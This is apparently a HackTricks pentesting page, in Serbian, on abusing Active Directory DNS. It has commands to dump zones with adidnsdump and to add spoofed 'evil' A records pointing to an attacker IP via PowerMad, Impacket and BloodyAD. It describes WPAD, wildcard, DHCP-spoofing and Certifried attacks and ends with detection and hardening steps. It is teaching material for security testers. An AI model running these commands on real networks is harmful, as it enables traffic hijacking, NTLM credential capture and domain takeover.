# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Podrazumevano, **bilo koji korisnik** u Active Directory može **enumerisati sve DNS zapise** u DNS zonama Domen ili Šume, slično prenosu zone (korisnici mogu da navedu podobjekte DNS zone u AD okruženju).

Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **enumeraciju** i **izvoz** **svi DNS zapisa** u zoni za svrhe rekognicije unutrašnjih mreža.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (april 2025) dodaje JSON/Greppable (`--json`) izlaz, višedretveno rešavanje DNS-a i podršku za TLS 1.2/1.3 prilikom povezivanja na LDAPS

Za više informacija pročitajte [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kreiranje / Modifikovanje zapisa (ADIDNS spoofing)

Zato što grupa **Authenticated Users** ima **Create Child** na DACL-u zone po defaultu, bilo koji domen korisnički nalog (ili nalog računara) može registrovati dodatne zapise. Ovo se može koristiti za preusmeravanje saobraćaja, NTLM relay coercion ili čak potpunu kompromitaciju domena.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py dolazi sa Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Uobičajene napadačke primitive

1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u pretraživača na nivou preduzeća sličnog LLMNR/NBNS spoofingu. Može se zloupotrebiti za hvatanje NTLM hash-eva ili za njihovo preusmeravanje na LDAP/SMB.  (Zahteva da WINS-lookup bude onemogućen.)
2. **WPAD hijack** – dodajte `wpad` (ili **NS** zapis koji upućuje na napadačev host da zaobiđe Global-Query-Block-List) i transparentno proksirajte odlazne HTTP zahteve za prikupljanje kredencijala.  Microsoft je zakrpio zaobilaženja wildcard/DNAME (CVE-2018-8320) ali **NS zapisi i dalje rade**.
3. **Preuzimanje zastare unosa** – preuzmite IP adresu koja je prethodno pripadala radnoj stanici i povezani DNS unos će se i dalje rešavati, omogućavajući delegaciju zasnovanu na resursima ili napade sa Shadow-Credentials bez dodirivanja DNS-a.
4. **DHCP → DNS spoofing** – na podrazumevanoj Windows DHCP+DNS implementaciji, neautentifikovani napadač na istoj podmreži može prepisati bilo koji postojeći A zapis (uključujući Domain Controllers) slanjem lažnih DHCP zahteva koji pokreću dinamičke DNS ažuriranja (Akamai “DDSpoof”, 2023).  Ovo daje mašini u sredini pristup preko Kerberos/LDAP i može dovesti do potpunog preuzimanja domena.
5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` mašinskog naloga koji kontrolišete, registrujte odgovarajući A zapis, a zatim zatražite sertifikat za to ime kako biste se pretvarali da ste DC. Alati kao što su **Certipy** ili **BloodyAD** potpuno automatizuju proces.

---

## Detekcija i učvršćivanje

* Odbijte **Authenticated Users** pravo *Kreiraj sve podobjekte* na osetljivim zonama i delegirajte dinamička ažuriranja posvećenom nalogu koji koristi DHCP.
* Ako su dinamička ažuriranja potrebna, postavite zonu na **Secure-only** i omogućite **Name Protection** u DHCP-u tako da samo objekat računara vlasnika može prepisati svoj zapis.
* Pratite DNS Server događaj ID-eve 257/252 (dinamičko ažuriranje), 770 (prenos zone) i LDAP zapise u `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokirajte opasna imena (`wpad`, `isatap`, `*`) sa namerno benignim zapisom ili putem Global Query Block List.
* Održavajte DNS servere ažuriranim – npr., RCE greške CVE-2024-26224 i CVE-2024-26231 dostigle su **CVSS 9.8** i mogu se daljinski iskoristiti protiv Domain Controllers.

## Reference

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, još uvek de-facto referenca za wildcard/WPAD napade)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
{{#include ../../banners/hacktricks-training.md}}
